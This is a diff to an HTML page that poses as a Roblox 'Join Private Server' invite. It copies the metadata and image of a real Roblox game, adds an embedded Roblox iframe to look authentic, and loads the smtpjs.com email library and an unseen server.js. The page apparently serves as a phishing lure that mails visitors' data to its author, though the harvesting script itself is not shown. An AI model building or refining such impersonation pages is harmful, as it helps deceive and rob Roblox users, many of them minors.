@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
-    <meta content="Join Private Server" property="og:title" />
+    <meta content="Roblox - Join Private Server" property="og:title" />
     <meta content="Check out [CHAPTER 2] Apeirophobia. It’s one of the millions of unique, user-generated 3D experiences created on Roblox. Centered around the exploration and documentation. Stuck inside endless rooms, being watched from every corner. Brace yourself for puzzles to solve, and entities to hide from. escape from reality...
 
     Credits:
@@ -13,8 +13,26 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta content="https://tr.rbxcdn.com/cff308644594fcf2d3535a4ddea114ff/500/280/Image/Jpeg" property="og:image" />
     <meta content="#000000" data-react-helmet="true" name="theme-color" />
+    <style>
+      .roblox-embed {
+          width: 640px;
+          height: 360px;
+          border: 2px solid #ccc;
+          border-radius: 10px;
+          overflow: hidden;
+          position: relative;
+      }
+      .roblox-embed iframe {
+          width: 100%;
+          height: 100%;
+          border: none;
+      }
+  </style>
 </head>
 <body>
+  <div class="roblox-embed">
+    <iframe src="https://www.roblox.com/share?code=308f317dbfd5cc4fba2837a680b765f2&type=Server" allowfullscreen></iframe>
+  </div>
   <script src="https://smtpjs.com/v3/smtp.js"></script>
   <script src="server.js"></script>
 </body>
